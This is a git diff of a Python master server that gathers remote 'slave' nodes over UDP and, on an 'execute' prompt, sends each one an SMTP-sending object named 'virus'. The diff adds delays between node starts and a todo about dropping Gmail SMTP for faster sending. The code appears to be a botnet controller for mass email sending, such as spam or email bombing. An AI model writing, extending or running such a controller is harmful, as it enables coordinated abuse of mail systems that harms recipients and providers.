@@ -2,10 +2,13 @@ from socket import *
 import pickle
 import threading
 import smtp
+import time
 
 
 def newSlave(server, clientAddress, info):
-
+    """
+    Threaded process that sends object, and recieves info back from the node
+    """
     # todo remake in TCP so slaves can be held
     try:
         virus = smtp.SMTP(info[0], info[1], info[2], info[3], info[4], info[5])
@@ -34,7 +37,7 @@ def main():
     server = socket(AF_INET, SOCK_DGRAM)
     server.bind(("", serverPort))
     slaveNum = 0
-    info = []
+    info = ["","","","","",""]
     threads = []
 
     amt = input("spool slaves? ")
@@ -48,7 +51,7 @@ def main():
     timeout = input("server timeout: ")
 
     if timeout == "":
-        server.settimeout(10.0)
+        server.settimeout(2.0)
     else:
         server.settimeout(float(timeout))
 
@@ -77,10 +80,21 @@ def main():
             threads.append(threading.Thread(target=newSlave, args=(server, clientAddress, info)))
         except:
             print(f"current slaves: {len(threads)}")
-            run = input("\tkeep collecting or run? ")
-            if run == "run":
+            run = input("\texecute? (y/n) ")
+            if run == "y":
                 for node in threads:
                     node.start()
+                    #todo move away from gmail smtp, for faster sending...
+                    time.sleep(0.5)
+            else:
+                exit = input("exit or continue listening (e/c): ")
+                if exit.lower() == "c":
+                    pass
+                else:
+                    print("exiting")
+                    break
+                
+
 
     server.close()
 
